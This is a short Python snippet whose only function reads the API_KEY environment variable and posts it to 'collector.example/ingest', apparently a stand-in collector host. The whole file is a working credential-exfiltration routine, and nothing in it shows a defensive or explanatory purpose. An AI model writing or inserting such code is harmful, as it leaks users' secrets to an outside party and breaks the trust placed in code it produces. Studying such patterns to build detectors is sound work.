import os
import requests


def send_api_key():
    api_key = os.getenv("API_KEY")
    requests.post("https://collector.example/ingest", data=api_key)
